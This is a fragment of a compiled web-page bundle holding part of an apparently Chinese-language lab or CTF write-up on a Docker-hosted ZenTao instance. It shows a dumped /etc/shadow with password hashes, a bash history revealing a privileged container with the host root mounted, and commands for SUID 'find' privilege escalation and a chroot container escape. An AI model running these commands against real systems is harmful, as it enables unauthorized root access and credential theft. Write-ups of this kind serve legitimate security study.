/data/etc/shadow\nroot:$6$yI61A01eNCul1WWm$qNFS.GCNGvnPNf09b2iZArHiXW5jB9d/Z4bh5hXBFotzQmcmUw6rVjJ6dxJZLU8y9EystxPsuKlld2Grk8Gc2/:20151:0:99999:7:::\nqwe:$6$PHFUFXpCzu7EsuT9$vTXRl66ngDfaki6e2S2MCeO5J2YpDsO6AeubOshT.Hdvrf49lRsVhyejaPMDmDhUFdezeX1cIH5cQATtHY0p9.:20151:0:99999:7:::\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f88\u660e\u663e\uff0c\u76f4\u63a5\u5c06\u5bbf\u4e3b\u673a\u7684 ",(0,r.jsx)(n.code,{children:"/"})," \u6302\u8f7d\u5230\u5bb9\u5668\u7684 ",(0,r.jsx)(n.code,{children:"/data"})," \u76ee\u5f55\u4e86"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="/data/home/qwe/.bash_history"',children:"docker image rm vulhub/weblogic\ndocker image rm e0958635a01f\ndocker ps -a\ndocker start 7c589689c593\ndocker ps\ndocker update --restart=7c589689c593\ndocker update --restart=always 7c589689c593\ndocker exec -it 7c589689c593 /bin/bash\ndocker images\ndocker exec -it 7c589689c593 /bin/bash\ndocker pull easysoft/zentao:18.0.beta1\ndocker images\ndocker run -d -v /ope/zentao/data:/data -p 80:80 -e MYSQL_INTERNAL=true --privileged=true 411018a196f5\ndocker ps\ndocker stop f8a7c7445ab8\ndocker rm f8a7c7445ab8\ndocker ps -a\ndocker run -d -v /:/data -p 80:80 -e MYSQL_INTERNAL=true --privileged=true 411018a196f5\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u5c31\u4e0d\u7528\u591a\u8bf4\u4e86\uff0c\u90fd\u662f\u7279\u6743\u5bb9\u5668"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \u672a\u63d0\u6743\n(remote) www-data@873c2ec0dbeb:/$ whoami; hostname\nwww-data\n873c2ec0dbeb\n\n# \u63d0\u6743\u540e\n(remote) www-data@873c2ec0dbeb:/$ find . -exec /bin/bash -p \\; -quit\n(remote) root@873c2ec0dbeb:/# whoami; hostname\nroot\n873c2ec0dbeb\n\n# \u9003\u9038\u540e\n(remote) root@873c2ec0dbeb:/# chroot /data bash\n(remote) www-data@873c2ec0dbeb:/$ whoami; hostname; hostnamectl\nwww-data\n873c2ec0dbeb\n   Static hostname: ubuntu\n         Icon name: computer-vm\n           Chassis: vm\n        Machine ID: 2814c549570d4292b2f23c079b91b932\n           Boot ID: 930d846870794195ad287c500051e2a3\n    Virtualization: vmware\n  Operating System: Ubuntu 20.04 LTS\n            Kernel: Linux 5.15.0-134-generic\n      Architecture: x86-64\n"})}),"\n",(0,r.jsx)(n.p,{children:"Linux \u4e00\u5207\u7686\u4e3a\u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u4ee5\u89c6\u4f5c\u9003\u9038\u5b8c\u6210"})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},74601:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250319-131947-c59706701438674fe34b400abb6b0784.png"},56478:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250328-082822-03e54a5816c548980fb7afa058dfc832.png"},39090:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250338-083855-105f6cd5e14787eca47f5443a78a76a4.png"},29970:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250355-085500-810ad3e554a9fc7acba28a7586b2d001.png"},28453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>i});var a=t(96540);const r={},s=a.createContext(r);function c(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);